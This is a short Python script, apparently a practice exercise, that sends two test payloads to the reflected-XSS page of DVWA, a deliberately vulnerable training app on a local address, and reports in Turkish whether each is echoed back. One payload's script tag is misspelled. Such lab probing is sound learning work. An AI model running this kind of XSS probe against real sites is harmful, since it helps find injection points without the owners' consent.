import requests


header = {"Cookie" : "security=low; "}
payload = ["<h1>kale</h1>","<sccript>alert(1);</script>"]


for i in payload:
    url = "http://192.168.1.44/dvwa/vulnerabilities/xss_r/?name="+i
    sonuc = requests.get(url = url ,headers=header)
    contents = sonuc.content
    if i in str(contents):
        print("xss mevcut olabilir")
        print(contents)
    else:
        print("temiz reis gec")
